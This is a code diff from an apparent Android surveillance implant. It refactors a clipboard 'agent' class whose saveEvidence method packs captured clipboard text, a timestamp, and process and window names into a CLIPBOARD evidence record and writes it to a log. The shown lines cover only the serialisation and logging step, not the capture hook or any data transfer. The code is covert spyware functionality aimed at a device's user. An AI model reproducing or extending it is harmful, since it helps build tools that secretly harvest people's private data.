@@ -1,5 +1,6 @@
 package com.ht.RCSAndroidGUI.agent;
 
+import java.util.ArrayList;
 import java.util.Date;
 
 import com.ht.RCSAndroidGUI.LogR;
@@ -9,6 +10,7 @@ import com.ht.RCSAndroidGUI.evidence.EvidenceType;
 import com.ht.RCSAndroidGUI.util.Check;
 import com.ht.RCSAndroidGUI.util.DataBuffer;
 import com.ht.RCSAndroidGUI.util.DateTime;
+import com.ht.RCSAndroidGUI.util.Utils;
 import com.ht.RCSAndroidGUI.util.WChar;
 
 import android.content.Context;
@@ -39,30 +41,23 @@ public class AgentClipboard extends AgentBase {
 	}
 
 	private void saveEvidence(String ret) {
-		DateTime now = new DateTime();
-		byte[] tm = now.getStructTm();
+		
+		final byte[] tm = (new DateTime()).getStructTm();
 		byte[] payload = WChar.getBytes(ret.toString(), true);
 		byte[] process = WChar.getBytes("Main", true);
 		byte[] window = WChar.getBytes("Main", true);
-
-		int size = tm.length + payload.length + process.length + window.length + 4;
-		final byte[] message = new byte[size];
-
-		final DataBuffer databuffer = new DataBuffer(message, 0, size);
-
-		databuffer.write(tm);
-		databuffer.write(process);
-		databuffer.write(window);
-		// payload
-		databuffer.write(payload);
-
-		// delimiter
-		databuffer.writeInt(Evidence.EVIDENCE_DELIMITER);
-
-		new LogR(EvidenceType.CLIPBOARD, null, message);
 		
-		byte last = message[message.length-1];
-		Check.ensures(message[message.length-1] == (byte) 0xab , "Wrong delmiter");
+		final ArrayList<byte[]> items = new ArrayList<byte[]>();
+		items.add(tm);
+		items.add(payload);
+		items.add(process);
+		items.add(window);
+		items.add(Utils.intToByteArray(Evidence.EVIDENCE_DELIMITER));
+
+		LogR log = new LogR(EvidenceType.CLIPBOARD);
+		log.write(items);
+		log.close();
+
 	}
 
 	@Override
